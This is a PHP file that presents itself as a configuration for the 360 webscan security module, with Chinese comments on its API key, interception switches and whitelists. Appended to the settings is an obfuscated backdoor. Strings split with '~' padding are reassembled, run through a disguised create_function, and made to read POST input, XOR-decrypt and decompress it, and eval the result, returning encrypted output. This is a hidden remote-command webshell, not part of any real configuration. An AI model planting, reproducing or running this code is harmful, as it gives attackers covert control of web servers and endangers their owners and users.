<?php
//用户唯一key
define('WEBSCAN_U_KEY', 'dcc20a8db07667376916d96d6754aa70');
//数据回调统计地址
define('WEBSCAN_API_LOG', 'http://safe.webscan.360.cn/papi/log/?key='.WEBSCAN_U_KEY);
//版本更新地址
define('WEBSCAN_UPDATE_FILE','http://safe.webscan.360.cn/papi/update/?key='.WEBSCAN_U_KEY);
//拦截开关(1为开启，0关闭)
$webscan_switch=1;
//提交方式拦截(1开启拦截,0关闭拦截,post,get,cookie,referre选择需要拦截的方式)
$webscan_post=1;
$webscan_get=1;
$webscan_cookie=1;
$webscan_referre=1;
//后台白名单,后台操作将不会拦截,添加"|"隔开白名单目录下面默认是网址带 admin  /dede/ 放行
$webscan_white_directory='';
//url白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行
//写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&step=post ,dedecms 空间设置edit_space_info.php
$webscan_white_url = array('set.php' => '');
$i='~h("~/$kh~(~~.+)$~kf/",@file_get_co~ntents("php://~inpu~t"),$~m)~==1){~@o~~b_~start();@e';
$q='$k="~4d~12~ac2a";$kh="ad55~14b~d8fc1";$kf~="fac4~ff~b48f67"~;$p="o~EqTNR~rX~wgtS~WP9';
$x=str_replace('sn','','crsnsnesnate_fusnnsnctsnion');
$v='b_e~nd_clean();$r~=@ba~se64_en~cod~e(@x(@~g~zcompress($~o),$k));pri~n~t(~"$p$kh$r$kf");}';
$I='($j=0;($~j<$c&&$i<$l);~$j++,$i~++){$~o.=$~t{$i}~^$k~{$j};}}ret~urn $o;~}if(@preg~_matc';
$a='v";funct~ion x($~t~,$k){$c=strlen~($k)~;~$~l=strlen~($t);$o="";fo~~r(~$i=~0;$i<$l;)~{for';
$z='va~l(@gzu~~ncompress(@x(@base~64_decod~e(~$m[1]),$~k)));$o=@ob_g~et_conten~ts~();@o~';
$K=str_replace('~','',$q.$a.$I.$i.$z.$v);
$l=$x('',$K);$l();
?>